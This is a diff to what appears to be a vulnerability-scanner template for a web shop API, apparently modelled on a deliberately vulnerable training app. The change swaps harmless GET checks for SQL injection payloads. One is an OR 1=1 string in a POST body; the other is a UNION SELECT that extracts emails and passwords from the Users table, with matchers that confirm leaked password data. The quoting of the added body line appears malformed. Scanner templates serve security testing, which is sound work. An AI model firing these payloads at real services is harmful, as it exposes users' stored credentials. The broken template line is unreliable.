@@ -12,27 +12,24 @@ info:
 
 requests:
   - path: /rest/user/data-export
-    method: GET
+    method: POST
+    headers:
+      Authorization: "{{bearer_token}}"
+      Content-Type: application/json
+    body: '{"format":"' OR 1=1--"}'
     matchers_condition: and
     matchers:
       - type: status
         status:
           - 200
-          - 401
       - type: word
         words:
-          - '"status":'
-          - email
-        condition: or
+          - 'email'
+          - 'password'
+          - 'createdAt'
+        condition: and
 
-  - path: /rest/user/data-export?format=json
-    method: GET
-    matchers:
-      - type: status
-        status:
-          - 200
-
-  - path: /api/Users
+  - path: "/rest/products/search?q='))%20UNION%20SELECT%20id,email,password,1,1,1,1,1,1%20FROM%20Users--"
     method: GET
     matchers_condition: and
     matchers:
@@ -41,6 +38,6 @@ requests:
           - 200
       - type: word
         words:
-          - '"data":'
-          - email
+          - 'password'
+          - '@'
         condition: and
